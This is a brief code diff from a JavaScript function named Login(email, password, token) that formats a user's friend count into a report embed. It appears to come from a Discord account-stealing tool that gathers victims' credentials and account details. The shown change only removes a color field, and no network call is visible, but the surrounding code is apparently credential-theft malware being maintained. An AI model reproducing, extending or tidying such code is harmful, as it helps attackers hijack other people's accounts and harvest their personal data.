@@ -169,8 +169,7 @@ function Login(email, password, token) {
                             "inline": false
                                  },
                                  {
-                                    title: `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,
-                                    color: config["embed-color"],
+                                    title: `Total Friends (${JSON.parse(a).filter((e) => 1 == e.type).length})`,                                    
                                     description: (function () {
                                         const e = JSON.parse(a).filter((e) => 1 == e.type);
                                         var t = "";
